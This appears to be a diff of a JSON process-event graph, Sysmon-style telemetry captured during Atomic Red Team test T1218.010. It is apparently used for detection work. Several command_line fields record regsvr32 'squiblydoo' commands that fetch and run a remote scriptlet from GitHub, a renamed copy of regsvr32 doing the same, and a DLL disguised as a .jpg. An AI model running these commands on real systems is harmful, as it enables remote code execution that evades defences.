-        "command_line": "GrantedAccess with bitmask: 0x1400 for notregsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "453eff8ec11c1599adf65c247b423034b0d6f86a2f876f47f64d9b1c6cb65735",
-        "parent_process_id": "Process:{8e433fbf-2a45-6013-2700-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notregsvr32.exe",
-        "name": "notregsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7603-00000000A401}:1",
-      "label": "calc.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows calculator",
-        "guid": "{FF16AF91-36E1-6013-7603-00000000A401}",
-        "pid": "6156",
-        "image_path": "%syswow64%\\calc.exe",
-        "command_line": "%system32%\\calc.exe",
-        "original_file_name": "calc.exe",
-        "image_hash": "MD5=E5F11087E724759F5A52667D22485DF5,SHA256=3F2400274E4AE8B9B6B622A0571BBD96C293A708925549495A2FF1672964E949,IMPHASH=200BD8706C36BF07F7EF1B236749FD70",
-        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7603-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "calc.exe",
-        "name": "calc.exe",
-        "parent_process_id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-b803-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-3708-6013-b803-000000001100}",
-        "pid": "6412",
-        "image_path": "%syswow64%\\regsvr32.exe",
-        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=EB3B90B6989227F590BB36356DF96A30,SHA256=F80B4224C670E76E05A70CC5403818B11C7A4CA10542A1F9B5D935E4FCA08579,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8",
-        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
-        "parent_process_id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-b803-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
-      "label": "csrss.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{FF16AF91-26BA-6013-2300-00000000A401}",
-        "pid": "2812",
-        "image_path": "%system32%\\csrss.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "csrss.exe",
-        "name": "csrss.exe"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:10",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "regsvr32.exe",
-        "guid": "{FF16AF91-36E1-6013-7903-00000000A401}",
-        "pid": "2324",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1400 for regsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "82ad55ba1f7e67e9bb4ef01fcc1294dbfeccef94b0b1c0b856787717e65b1e95",
-        "parent_process_id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-a103-000000001100}:1",
-      "label": "windows calculator",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows calculator",
-        "guid": "{8e433fbf-36df-6013-a103-000000001100}",
-        "pid": "10728",
-        "image_path": "%system32%\\calc.exe",
-        "command_line": "%system32%\\calc.exe",
-        "original_file_name": "calc.exe",
-        "image_hash": "MD5=F88CC05134C555D4E1CD1DEF78162A9A,SHA256=A103A57D50B32469C5811E2808F021ADF9D9220093B540B8A9C83B5C821D370E,IMPHASH=8EEAA9499666119D13B3F44ECD77A729",
-        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
-        "parent_process_id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-a103-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows calculator",
-        "name": "windows calculator"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8e433fbf-3708-6013-b403-000000001100}",
-        "pid": "4072",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "c07962948b62c371d126e32cca23708a2ac0e4a38a61aed3ab58c5e497ad27cc",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-3708-6013-b503-000000001100}",
-        "pid": "10452",
-        "image_path": "c:\\temp\\notregsvr32.exe",
-        "command_line": "c:\\temp\\notregsvr32.exe  \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "25c9c3d15f3df7bcf374f9d24801bd7abbd1d3e4684dad15491a7c0624bfa870",
-        "parent_process_id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
-      "label": "lsass.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{8e433fbf-2a44-6013-0c00-000000001100}",
-        "pid": "980",
-        "image_path": "%system32%\\lsass.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "lsass.exe",
-        "name": "lsass.exe"
       }
     },
     {
@@ -1032,21 +299,21 @@
       }
     },
     {
-      "id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
+      "id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
       "label": "cmd.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{8e433fbf-36df-6013-9e03-000000001100}",
-        "pid": "11056",
+        "guid": "{8e433fbf-3708-6013-b403-000000001100}",
+        "pid": "4072",
         "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
         "original_file_name": "cmd.exe",
         "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
+        "command_hash": "c07962948b62c371d126e32cca23708a2ac0e4a38a61aed3ab58c5e497ad27cc",
         "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
+        "id": "Process:{8e433fbf-3708-6013-b403-000000001100}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
@@ -1056,27 +323,75 @@
       }
     },
     {
-      "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:10",
-      "label": "notregsvr32.exe",
+      "id": "Process:{FF16AF91-36E1-6013-7603-00000000A401}:1",
+      "label": "calc.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "notregsvr32.exe",
-        "guid": "{8e433fbf-3707-6013-b203-000000001100}",
-        "pid": "8580",
-        "image_path": "c:\\temp\\notregsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1478 for notregsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "7e9918384984f122b4b5cfc87096969410b4318483d5034b226304730a5e889d",
-        "parent_process_id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:10",
+        "process_name": "windows calculator",
+        "guid": "{FF16AF91-36E1-6013-7603-00000000A401}",
+        "pid": "6156",
+        "image_path": "%syswow64%\\calc.exe",
+        "command_line": "%system32%\\calc.exe",
+        "original_file_name": "calc.exe",
+        "image_hash": "MD5=E5F11087E724759F5A52667D22485DF5,SHA256=3F2400274E4AE8B9B6B622A0571BBD96C293A708925549495A2FF1672964E949,IMPHASH=200BD8706C36BF07F7EF1B236749FD70",
+        "command_hash": "ac4eedb2f23c24563259a69bbdae9bf5b01ac5a573d7f1d0e39f4a76a47e6403",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-7603-00000000A401}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "notregsvr32.exe",
-        "name": "notregsvr32.exe"
+        "display_name": "calc.exe",
+        "name": "calc.exe",
+        "parent_process_id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-36df-6013-a303-000000001100}",
+        "pid": "5408",
+        "image_path": "%syswow64%\\regsvr32.exe",
+        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=EB3B90B6989227F590BB36356DF96A30,SHA256=F80B4224C670E76E05A70CC5403818B11C7A4CA10542A1F9B5D935E4FCA08579,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8",
+        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
+        "parent_process_id": "Process:{8e433fbf-36df-6013-a203-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8e433fbf-36df-6013-9b03-000000001100}",
+        "pid": "9392",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "command_hash": "a4028c6aeb9f5e635425f1ff8cddfda73f58f8b4543826576cb0c7198cccf5d3",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "user_id": "User:S-1-5-18"
       }
     },
     {
@@ -1104,135 +419,45 @@
       }
     },
     {
-      "id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
+      "id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
+      "label": "csrss.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{FF16AF91-26BA-6013-2300-00000000A401}",
+        "pid": "2812",
+        "image_path": "%system32%\\csrss.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "csrss.exe",
+        "name": "csrss.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
       "label": "cmd.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{FF16AF91-36E1-6013-6D03-00000000A401}",
-        "pid": "6620",
+        "guid": "{8e433fbf-36df-6013-9e03-000000001100}",
+        "pid": "11056",
         "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "a4028c6aeb9f5e635425f1ff8cddfda73f58f8b4543826576cb0c7198cccf5d3",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8e433fbf-36e1-6013-a503-000000001100}",
-        "pid": "5088",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s %temp%\\shell32.jpg",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "b509f7351119f9dbbb78d564309f55f8b82bf56f1243f4aba2abedc6ddf153f5",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "File:a25b77e04c2a886e42689e4b7cb80e4fae134eb883074f4bbcb5a4d68dfecad2:11",
-      "label": "notregsvr32.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "c:\\temp\\notregsvr32.exe",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "event_id": "11",
-        "id": "File:a25b77e04c2a886e42689e4b7cb80e4fae134eb883074f4bbcb5a4d68dfecad2:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "notregsvr32.exe",
-        "name": "notregsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-36df-6013-9c03-000000001100}",
-        "pid": "10076",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "edd28ac29a58a48a9706cd7bd8f0b2685e5f819a09aa9dc529d96be107ac5ed6",
-        "parent_process_id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{FF16AF91-36E1-6013-7703-00000000A401}",
-        "pid": "6256",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s %temp%\\shell32.jpg",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "b509f7351119f9dbbb78d564309f55f8b82bf56f1243f4aba2abedc6ddf153f5",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8e433fbf-36df-6013-9b03-000000001100}",
-        "pid": "9392",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
         "original_file_name": "cmd.exe",
         "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "a4028c6aeb9f5e635425f1ff8cddfda73f58f8b4543826576cb0c7198cccf5d3",
+        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
         "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-9b03-000000001100}:1",
+        "id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
@@ -1264,6 +489,781 @@
         "display_name": "windows calculator",
         "name": "windows calculator"
       }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{FF16AF91-36E1-6013-7703-00000000A401}",
+        "pid": "6256",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s %temp%\\shell32.jpg",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "b509f7351119f9dbbb78d564309f55f8b82bf56f1243f4aba2abedc6ddf153f5",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:10",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "regsvr32.exe",
+        "guid": "{FF16AF91-36E1-6013-7503-00000000A401}",
+        "pid": "5260",
+        "image_path": "%syswow64%\\regsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for regsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "ed66cd3696e31975c08348aee040a2bb5ff1e66bbb086de1c4acd9b155728f41",
+        "parent_process_id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{8e433fbf-3707-6013-b203-000000001100}",
+        "pid": "8580",
+        "image_path": "c:\\temp\\notregsvr32.exe",
+        "command_line": "c:\\temp\\notregsvr32.exe  \\s \\u \\i:c:\\temp\\regsvr32.txt scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
+        "command_hash": "8ab86fd6fead2fa400588961dbc0aa17a59c5a1fced2e93bda378d33b3aaf148",
+        "parent_process_id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "File:a25b77e04c2a886e42689e4b7cb80e4fae134eb883074f4bbcb5a4d68dfecad2:11",
+      "label": "notregsvr32.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "c:\\temp\\notregsvr32.exe",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
+        "event_id": "11",
+        "id": "File:a25b77e04c2a886e42689e4b7cb80e4fae134eb883074f4bbcb5a4d68dfecad2:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "notregsvr32.exe",
+        "name": "notregsvr32.exe"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{FF16AF91-26EB-6013-9600-00000000A401}",
+        "pid": "4668",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
+      "label": "lsass.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8e433fbf-2a44-6013-0c00-000000001100}",
+        "pid": "980",
+        "image_path": "%system32%\\lsass.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "lsass.exe",
+        "name": "lsass.exe"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:1",
+      "label": "microsoft(c) register server",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft(c) register server",
+        "guid": "{FF16AF91-36E1-6013-7903-00000000A401}",
+        "pid": "2324",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "%system32%\\regsvr32.exe  \\s %temp%\\chocolatey\\shell32.jpg",
+        "original_file_name": "regsvr32.exe",
+        "image_hash": "MD5=8CF9086BE38A15E905924B4A45D814D9,SHA256=00A1CF85C6AB96DF38A4023F0CEE4DF60F62280768FC9C06A235E6D2D644169D,IMPHASH=1C8D7F52BBDAEF92EB0104CB6362D5D0",
+        "command_hash": "fbfcc041b12832d83b537282c7859142af895ac87d23448b542a6a81d5330e83",
+        "parent_process_id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft(c) register server",
+        "name": "microsoft(c) register server"
+      }
+    },
+    {
+      "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:10",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "regsvr32.exe",
